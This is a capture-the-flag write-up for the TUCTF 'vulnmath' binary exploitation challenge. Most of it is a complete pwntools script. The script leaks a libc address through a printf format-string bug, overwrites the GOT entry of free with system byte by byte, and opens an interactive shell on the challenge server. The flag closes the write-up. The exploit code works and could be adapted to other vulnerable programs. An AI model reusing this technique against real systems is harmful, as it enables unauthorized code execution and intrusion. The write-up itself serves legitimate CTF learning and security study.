# vulnmath

## PWN - Points: 500

> Enter the belly of the beast and emerge victorious.
>
> 
>
> nc chal.tuctf.com 30502
>
> [vulnmath](vulnmath)
>

Exploit format strings with `printf` and leak a pointer to `libc` and overwrite the `GOT` entry of `free` with `system` function byte-by-byte with four format strings.

Exploit script:

```python
from pwn import *


libc = ELF('libc.so.6')
e = ELF('vulnmath')

# context.terminal = ['termite', '-e']
# p = gdb.debug('./vulnmath')
# p = process('vulnmath')
p = remote('chal.tuctf.com', 30502)

p.sendlineafter('> ', '%23$x')
print p.recvline()

libc_base = int(p.recvline()[:-1], 16) - 0x1EFB9
log.info('libc base: {}'.format(hex(libc_base)))
system = libc_base + libc.symbols['system']

payload = fmtstr_payload(6, {e.got['free']: system & 0xFF}, write_size='int')
p.sendlineafter('> ', payload)

payload = fmtstr_payload(6, {e.got['free']+1: system >> 8 & 0xFF}, write_size='int')
p.sendlineafter('> ', payload)

payload = fmtstr_payload(6, {e.got['free']+2: system >> 16 & 0xFF}, write_size='int')
p.sendlineafter('> ', payload)

payload = fmtstr_payload(6, {e.got['free']+3: system >> 24 & 0xFF}, write_size='int')
p.sendlineafter('> ', payload)

p.sendlineafter('> ', 'sh\x00')

p.interactive()
```

flag: `TUCTF{I_w45_w4rn3d_4b0u7_pr1n7f..._bu7_I_d1dn'7_l1573n}`